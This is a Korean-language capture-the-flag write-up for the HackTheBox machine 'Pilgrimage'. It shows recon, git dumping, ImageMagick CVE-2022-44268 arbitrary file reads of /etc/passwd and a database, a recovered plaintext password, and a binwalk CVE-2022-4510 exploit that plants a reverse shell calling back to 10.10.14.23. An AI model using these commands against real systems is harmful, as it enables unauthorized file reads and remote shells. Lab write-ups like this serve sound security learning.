# Pilgrimage - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA Pilgrimage 10.129.8.27
```
<img width="1105" height="416" alt="image" src="https://github.com/user-attachments/assets/eedf9b12-a19a-4771-8413-a158bf2988a3" />

- SSH(22)
- HTTP(80)

<br>

- `/etc/hosts`에 `pilgrimage.htb` 추가.
<img width="1104" height="60" alt="image" src="https://github.com/user-attachments/assets/587301c0-57bb-4c11-b2d7-b472ecdfd81a" />

---
## HTTP(80)
### banner grabbing
<img width="1105" height="320" alt="image" src="https://github.com/user-attachments/assets/b7fc7b43-07fe-46d8-bf5c-7be9442679b9" />

### GIT
- `nmap`으로 도메인 스캔하여 `.git` 발견.
```bash
sudo nmap -p 80 -sC -sV pilgrimage.htb
```
<img width="1105" height="451" alt="image" src="https://github.com/user-attachments/assets/1a414399-ab92-4b55-b177-576db18516fb" />

<br>
<br>

- `git-dumper`를 사용하여 가져오기.
```bash
git-dumper http://pilgrimage.htb ./git
```
<img width="1105" height="280" alt="image" src="https://github.com/user-attachments/assets/aad2ccf8-8eea-45f3-923c-be0ad1e7bde9" />

<br>
<br>

- 가져온 `git`이 서버에서 제공하는 요소들과 흡사한 것 같다는 생각을 하게 됨.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/f82a4be3-b656-409d-bbe0-8f38dbb64f20" />

<br>
<br>

- 파일을 업로드하여 `Shrink` 버튼을 누르게 되면 사진의 크기를 줄여주는 프로그램이 실행 됨.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/f8d69738-ddc0-40ba-a4f8-08e1801ed131" />

### CVE-2022-44268
- `magick` 버전 확인.
```bash
./magick --version
```
<img width="1105" height="183" alt="image" src="https://github.com/user-attachments/assets/d612201a-bfc7-4329-a9c4-80a2ebf28a98" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2022-44268
<img width="1222" height="475" alt="image" src="https://github.com/user-attachments/assets/85b47985-0fa8-4979-a917-c199e878f02d" />

<br>
<br>

- https://git.rotfl.io/v/CVE-2022-44268
- `/etc/passwd`를 읽는 이미지 파일을 생성.
```rust
cargo run “/etc/passwd”
```
<img width="1105" height="258" alt="image" src="https://github.com/user-attachments/assets/22239fb5-5495-4704-8e2c-37ad256bad98" />

<br>
<br>

- 이미지 파일 업로드.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/ce9f9ac1-5d34-4d5a-a13f-7586c6bb38e5" />

<br>
<br>

- 생성된 이미지 파일 다운로드하여 메타데이터 확인.
```bash
wget http://pilgrimage.htb/shrunk/696d77c46a12a.png

identify -verbose 696d77c46a12a.png
```
<img width="1103" height="385" alt="image" src="https://github.com/user-attachments/assets/eda86cee-cd49-46d7-8197-697894dc90c1" />

<br>
<br>

- `signiture` 윗부분을 공백 없이 저장.
<img width="1103" height="556" alt="image" src="https://github.com/user-attachments/assets/bcf56b61-349b-4292-a936-9b2a18b07295" />

<br>
<br>

- 디코딩 진행.
```bash
cat data|xxd -r -p
```
<img width="1103" height="556" alt="image" src="https://github.com/user-attachments/assets/d56e91d7-0b08-47ae-8c96-0e8b0500ea87" />

<br>
<br>

- `emily`의 `id_rsa`와 `.bash_history`는 가져올 수 없었음.
- `login.php`에서 `sqlite`를 사용하여 로그인을 진행하는 것으로 확인.
<img width="1103" height="314" alt="image" src="https://github.com/user-attachments/assets/4f64a731-0342-4c3a-be55-3f750bba364c" />

<br>
<br>

- `/var/db/pilgrimage`파일을 읽을 수 있는지 시도.
```bash
cargo run "/var/db/pilgrimage"

http://pilgrimage.htb/shrunk/696d7c08ec431.png
```
<img width="1103" height="334" alt="image" src="https://github.com/user-attachments/assets/c608350c-492b-497b-a1ee-b21b75961975" />

<br>
<br>

- 디코딩하여 `db`로 저장.
```bash
cat data|xxd -r -p > db

file db
```
<img width="1103" height="145" alt="image" src="https://github.com/user-attachments/assets/6d7b1515-c90e-4160-8ca9-de6a74e8c45e" />

<br>
<br>

- `emily` 계정 획득.
```bash
sqlite3 db .dump
```
<img width="1103" height="163" alt="image" src="https://github.com/user-attachments/assets/b3f759c5-e2a9-40be-8364-d8e3af6480ab" />

<br>
<br>

- `emily:abigchonkyboi123` 로그인.
```bash
ssh emily@10.129.8.27
```
<img width="1103" height="272" alt="image" src="https://github.com/user-attachments/assets/adfe8dbd-a77a-443d-84f3-c3d0e58cda28" />

---
## Privesc
- `malwarecan.sh`가 `root`권한으로 실행되는 것을 확인.
```bash
ps aux
```
<img width="1103" height="24" alt="image" src="https://github.com/user-attachments/assets/8771178b-ee63-4f7b-9374-0b891a59c8d2" />

<br>
<br>

- `/var/www/pilgrimage.htb/shrunk/`에 생성된 파일을 `binwalk`라는 프로그램이 실행.
<img width="1103" height="307" alt="image" src="https://github.com/user-attachments/assets/5dfec015-eab6-4ad9-a7af-2d1a83274d8a" />

### CVE-2022-4510
- `binwalk` 버전 확인.
<img width="1103" height="106" alt="image" src="https://github.com/user-attachments/assets/a023f94d-57f0-4513-876b-fcbb3c58d4cc" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2022-4510
<img width="1212" height="523" alt="image" src="https://github.com/user-attachments/assets/fceb42de-2621-4094-83cb-2d4ee5ea6b62" />

<br>
<br>

- `png`파일에 리버스 셸 명령어를 추가해주는 스크립트.
```bash
searchsploit -m 51249
```
<img width="1105" height="566" alt="image" src="https://github.com/user-attachments/assets/c7ab75e6-1808-4f87-9673-edfd3a2dffbd" />

<br>
<br>

- 스크립트 실행하여 이미지 파일 생성.
```bash
python3 51249.py dog.png 10.10.14.23 80
```
<img width="1105" height="375" alt="image" src="https://github.com/user-attachments/assets/11b53816-a341-46d7-b4ed-5b9ac7edb7e1" />

<br>
<br>

- 로컬로부터 다운로드.
```bash
wget http://10.10.14.23:8888/binwalk_exploit.png
```
<img width="1105" height="200" alt="image" src="https://github.com/user-attachments/assets/9f7b2fd6-8339-442a-a6c0-8c59eea3c5bc" />

<br>
<br>

- 다운로드가 완료되면 셸 획득.
<img width="1104" height="153" alt="image" src="https://github.com/user-attachments/assets/d0e1f4c7-afd9-4c5a-99fd-4b328e397369" />

---
## FLAG
- `/home/emily/user.txt`
<img width="1104" height="250" alt="image" src="https://github.com/user-attachments/assets/e2051984-4f09-4566-80fd-e24aac24742f" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="250" alt="image" src="https://github.com/user-attachments/assets/dad6783d-7a81-4fe1-8b59-dce96da1347c" />
